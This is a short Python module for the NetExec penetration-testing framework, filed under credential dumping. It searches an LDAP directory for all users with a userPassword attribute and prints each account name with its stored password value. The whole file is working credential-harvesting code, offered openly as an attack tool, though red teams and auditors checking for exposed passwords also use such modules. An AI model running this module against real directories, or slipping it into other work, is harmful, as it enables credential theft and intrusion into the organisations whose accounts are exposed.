from impacket.ldap import ldap as ldap_impacket
from nxc.helpers.misc import CATEGORY
from nxc.logger import nxc_logger
from nxc.parsers.ldap_results import parse_result_attributes


class NXCModule:
    """
    Get userPassword attribute from all users in ldap
    Module by @SyzikSecu
    """

    name = "get-userPassword"
    description = "Get userPassword attribute from all users in ldap"
    supported_protocols = ["ldap"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """
        """

    def on_login(self, context, connection):
        searchFilter = "(userPassword=*)"

        try:
            context.log.debug(f"Search Filter={searchFilter}")
            resp = connection.ldap_connection.search(
                searchFilter=searchFilter,
                attributes=["sAMAccountName", "userPassword"],
                sizeLimit=0,
            )
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                context.log.debug("sizeLimitExceeded exception caught, giving up and processing the data received")
                resp = e.getAnswers()
            else:
                nxc_logger.debug(e)
                return False

        if resp:
            resp_parsed = parse_result_attributes(resp)
            context.log.success("Found following users: ")
            for user in resp_parsed:
                context.log.highlight(f"User: {user['sAMAccountName']} userPassword: {user['userPassword']}")
        else:
            context.log.fail("No userPassword Found")
